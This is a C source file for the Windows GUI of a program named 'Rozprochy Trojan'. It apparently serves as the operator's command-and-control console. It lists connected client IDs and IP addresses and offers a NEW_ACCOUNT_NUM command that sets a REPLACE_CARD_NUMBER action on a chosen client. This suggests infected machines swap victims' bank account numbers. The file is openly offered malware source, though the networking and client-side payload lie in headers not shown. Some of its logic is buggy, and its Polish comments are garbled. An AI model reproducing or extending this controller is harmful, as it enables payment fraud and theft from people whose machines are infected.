#ifndef UNICODE
#define UNICODE
#endif 
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <commctrl.h>
#include "server.h"
#include "utils.h"

#pragma comment(lib, "comctl32.lib")

#define WIN_NAME L"Rozprochy Trojan"

// ID for the terminal window control
#define TERMINAL_ID     1001
#define COMMAND_INPUT_ID 1002
#define SERVER_START_ID 101
#define SERVER_STOP_ID  102
#define EXIT_ID         103

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK CommandInputProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int currentClientPanel = -1;

HWND g_hMainWindow = NULL;
HWND g_hClientListView = NULL;
HWND hTerminalWnd = NULL;
HWND g_hCommandInputWnd = NULL;

WNDPROC g_originalEditProc = NULL;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    EnableConsole();

    InitCommonControls();

    // Register the window class.
    const wchar_t CLASS_NAME[] = L"Sample Window Class";

    WNDCLASS wc = { 0 };

    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    // Create the window.
    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        CLASS_NAME,                     // Window class
        WIN_NAME,                       // Window text
        WS_OVERLAPPEDWINDOW,            // Window style
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL,       // Parent window    
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL)
    {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    g_hMainWindow = hwnd;

    // Run the message loop.
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

#define CLIENT_LIST_POS_X 10
#define CLIENT_LIST_POS_Y 10
#define CLIENT_LIST_WIDTH 600
#define CLIENT_LIST_HEIGHT 240
void CreateClientList(HWND hwnd) {
    g_hClientListView = CreateWindowEx(0, WC_LISTVIEW, NULL,
        WS_VISIBLE | WS_CHILD | LVS_REPORT | LVS_SINGLESEL,
        CLIENT_LIST_POS_X, CLIENT_LIST_POS_Y,
        CLIENT_LIST_WIDTH, CLIENT_LIST_HEIGHT,
        hwnd, (HMENU)1, GetModuleHandle(NULL), NULL);

    if (g_hClientListView) {
        // Ustaw style extended (gridlines, pe³ny wybór wiersza)
        ListView_SetExtendedListViewStyle(g_hClientListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);

        // Dodaj kolumny
        LVCOLUMN lvc = { 0 };
        lvc.mask = LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;

        lvc.pszText = L"Client ID";
        lvc.cx = 100;
        ListView_InsertColumn(g_hClientListView, 0, &lvc);

        lvc.pszText = L"IP Address";
        lvc.cx = 150;
        ListView_InsertColumn(g_hClientListView, 1, &lvc);

        lvc.pszText = L"Status";
        lvc.cx = 100;
        ListView_InsertColumn(g_hClientListView, 2, &lvc);
    }
}

void CreateMenuBar(HWND hwnd) {
    HMENU hMenubar = CreateMenu();
    HMENU hFile = CreateMenu();

    AppendMenu(hFile, MF_STRING, SERVER_START_ID, L"Start server");
    AppendMenu(hFile, MF_STRING, SERVER_STOP_ID, L"Stop server");
    AppendMenu(hFile, MF_STRING, EXIT_ID, L"Exit");

    AppendMenu(hMenubar, MF_POPUP, (UINT_PTR)hFile, L"File");

    SetMenu(hwnd, hMenubar);
}

#define TERMINAL_POS_X 10
#define TERMINAL_POS_Y 10 + CLIENT_LIST_HEIGHT
#define TERMINAL_WIDTH CLIENT_LIST_WIDTH
#define TERMINAL_HEIGHT 240
void CreateTerminalWindow(HWND hwndMain) {
    // Create the edit control that will act as the terminal (readonly)
    hTerminalWnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        L"EDIT",
        L"",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_WANTRETURN | ES_READONLY,
        TERMINAL_POS_X, TERMINAL_POS_Y, TERMINAL_WIDTH, TERMINAL_HEIGHT, // Position and size
        hwndMain, // Parent window
        (HMENU)TERMINAL_ID, // Control ID
        GetModuleHandle(NULL),
        NULL
    );

    if (hTerminalWnd == NULL) {
        MessageBox(hwndMain, L"Failed to create terminal window.", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    g_originalEditProc = (WNDPROC)SetWindowLongPtr(hTerminalWnd, GWLP_WNDPROC, NULL);

    // Set font for terminal (optional)
    HFONT hFont = CreateFont(
        14, 0, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, L"Consolas"
    );
    SendMessage(hTerminalWnd, WM_SETFONT, hFont, TRUE);

    // Set initial text for the terminal
    SetWindowText(hTerminalWnd, L"Terminal Ready...\n");
}

void WriteToTerminal(const wchar_t* message) {
    int len = GetWindowTextLength(hTerminalWnd);
    SendMessage(hTerminalWnd, EM_SETSEL, (WPARAM)len, (LPARAM)len); // Move cursor to the end
    SendMessage(hTerminalWnd, EM_REPLACESEL, 0, (LPARAM)message);  // Append message

    // Append newline to the terminal output
    SendMessage(hTerminalWnd, EM_REPLACESEL, 0, (LPARAM)L"\n");
}


void CreateCommandInputWindow(HWND hwndMain) {
    // Create a new edit control for command input
    g_hCommandInputWnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        L"EDIT",
        L"",
        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
        TERMINAL_POS_X, TERMINAL_POS_Y + TERMINAL_HEIGHT, TERMINAL_WIDTH, 30,
        hwndMain, // Parent window
        (HMENU)COMMAND_INPUT_ID, // Control ID
        GetModuleHandle(NULL),
        NULL
    );

    if (g_hCommandInputWnd == NULL) {
        MessageBox(hwndMain, L"Failed to create command input window.", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Set font for command input
    HFONT hFont = CreateFont(
        14, 0, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, L"Consolas"
    );
    SendMessage(g_hCommandInputWnd, WM_SETFONT, hFont, TRUE);

    // Subclass the command input window to capture Enter key presses
    g_originalEditProc = (WNDPROC)SetWindowLongPtr(g_hCommandInputWnd, GWLP_WNDPROC, (LONG_PTR)CommandInputProc);
}

bool checkIfOnlyNumbers(char* str) {
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] < '0' && '9' < str[i]) {
            return false;
        }
    }

    return true;
}


#include <wchar.h>
#include <string.h>

void HandleCommand(wchar_t* inputCommand) {
    // Bufory do przechowywania czêœci komendy
    wchar_t klient[100], komenda[100], argument[100];

    // Rozdziel tekst na 3 czêœci: KLIENT KOMENDA OPCJONALNY_ARGUMENT
    int itemsRead = swscanf(inputCommand, L"%99s %99s %99s", klient, komenda, argument);

    // Sprawdzenie, czy uda³o siê poprawnie rozdzieliæ dane
    if (itemsRead < 2) {
        WriteToTerminal(L"Invalid command format. Please enter in the format: KLIENT NEW_ACCOUNT_NUM <nowy_numer_konta>.\n");
        return;
    }

    // Przekonwertuj klienta na int
    int clientId = _wtoi(klient);

    // Komenda NEW_ACCOUNT_NUM
    if (wcscmp(komenda, L"NEW_ACCOUNT_NUM") == 0) {
        if (itemsRead != 3) {
            WriteToTerminal(L"Invalid number of arguments. Correct format: KLIENT NEW_ACCOUNT_NUM <nowy_numer_konta>.\n");
            return;
        }


        // Akcja zwi¹zana z nowym numerem konta
        wchar_t response[200];

        setClientAccountNumber(clientId, argument);
        setClientAction(clientId, REPLACE_CARD_NUMBER);
        swprintf(response, 200, L"Client %d: New account number %s has been set.\n", clientId, argument);

        WriteToTerminal(response);
    }
    else {
        WriteToTerminal(L"Unknown command. Please try again.\n");
    }
}


LRESULT CALLBACK CommandInputProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_KEYDOWN && wParam == VK_RETURN) {
        // Get the command text
        int len = GetWindowTextLength(hwnd);
        wchar_t* command = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
        GetWindowText(hwnd, command, len + 1);

        // Send the command to the terminal
        WriteToTerminal(command);
        HandleCommand(command);

        // Clear the command input field
        SetWindowText(hwnd, L"");

        free(command);
        return 0;
    }

    return CallWindowProc(g_originalEditProc, hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        CreateMenuBar(hwnd);
        CreateClientList(hwnd);
        CreateTerminalWindow(hwnd);
        CreateCommandInputWindow(hwnd);

        return 0;
    }
    case WM_COMMAND: {
        const WORD id = LOWORD(wParam);

        if (id == SERVER_START_ID) {
            initServerThread();
        }
        else if (id == SERVER_STOP_ID) {
            stopServerThread();
        }
        else if (id == EXIT_ID) {
            PostMessage(hwnd, WM_CLOSE, 0, 0);
        }

        return 0;
    }
    case WM_USER + 1:
        UpdateClientListView();
        return 0;
    case WM_DESTROY: {
        PostQuitMessage(0);
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));

        EndPaint(hwnd, &ps);

        return 0;
    }
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
